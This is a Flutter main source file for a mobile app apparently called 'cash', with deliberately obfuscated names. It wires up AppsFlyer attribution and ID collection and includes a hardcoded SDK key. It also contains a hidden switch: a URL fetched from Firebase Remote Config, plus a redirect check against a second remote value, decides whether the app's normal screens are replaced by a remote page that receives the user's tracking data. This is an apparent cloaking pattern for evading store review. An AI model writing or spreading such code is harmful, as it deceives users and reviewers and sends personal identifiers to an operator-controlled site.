import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:cash/util/app_routes.dart';
import 'package:cash/views/app/views/firebase_options.dart';
import 'package:cash/views/settings/views/dsa.dart';
import 'package:cash/views/synopsys/views/synopsys_screen.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'data/repository/onboarding_repository.dart';

late AppsflyerSdk fsdfsdf;
bool stat = false;
String xsaxasasfds = '';
String authxa = '';
Map gdfgdfgdf = {};
Map vxdsfdsgs = {};
bool ghjghjghjgh = false;
String dsxdscds = '';
String _campaign = '';
String nbvbcvds = '';
String _campaignId = '';
Future<void> gfdgdfgd() async {
  final TrackingStatus dasfa =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(dasfa);
}

Future<void> gdfgdfhf() async {
  try {
    nbvbcvds = await fsdfsdf.getAppsFlyerUID() ?? '';
    print("AppsFlyer ID: $nbvbcvds");
  } catch (e) {
    print("Failed to get AppsFlyer ID: $e");
  }
}

Future<void> mkofmsdfklsd() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
    appId: '6503913797',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  fsdfsdf = AppsflyerSdk(options);

  await fsdfsdf.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  fsdfsdf.onAppOpenAttribution((res) {
    gdfgdfgdf = res;
    authxa = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  fsdfsdf.onInstallConversionData((res) {
    vxdsfdsgs = res;
    ghjghjghjgh = res['payload']['is_first_launch'];
    dsxdscds = res['payload']['af_status'];
    xsaxasasfds = '&is_first_launch=$ghjghjghjgh&af_status=$dsxdscds';
  });

  fsdfsdf.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());
    gdfgdfgdf = dp.toJson();
  });

  fsdfsdf.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
  await gdfgdfhf();
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await Maxiz().activate();
  await mkofmsdfklsd();
  await gfdgdfgd();
  bool isFirstTime = await OnboardingRepository().checkFirstTime();
  runApp(MyApp(isFirstLaunch: isFirstTime));
}

class MyApp extends StatelessWidget {
  const MyApp({super.key, required this.isFirstLaunch});

  final bool isFirstLaunch;

  @override
  Widget build(BuildContext context) {
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
    ]);
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
        future: gfsdfdsfsd(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.black,
              child: Center(
                child: Container(
                  height: 70,
                  width: 70,
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(15),
                    child: Image.asset('assets/icons/icon.png'),
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && mfklsdmfkldsf != '') {
              return Pxamifds(
                gfdgdfg: mfklsdmfkldsf,
                hkjhkhjk: xsaxasasfds,
                lkjbhgvdf: nbvbcvds,
              );
            } else {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                theme: ThemeData(primarySwatch: Colors.yellow),
                onGenerateRoute: AppRoutes.onGenerateRoute,
                initialRoute:
                    isFirstLaunch ? AppRoutes.welcome : AppRoutes.home,
              );
            }
          }
        },
      ),
    );
  }
}

String mfklsdmfkldsf = '';

Future<bool> gfsdfdsfsd() async {
  final mfjksdmfkdsf = FirebaseRemoteConfig.instance;
  await mfjksdmfkdsf.fetchAndActivate();
  await mkofmsdfklsd();
  await gdfgdfhf();
  String dsdfdsfgdg = mfjksdmfkdsf.getString('wallet');
  String cdsfgsdx = mfjksdmfkdsf.getString('wallex');
  if (!dsdfdsfgdg.contains('none')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      mfklsdmfkldsf = dsdfdsfgdg;
      return true;
    }
  }
  return dsdfdsfgdg.contains('none') ? false : true;
}
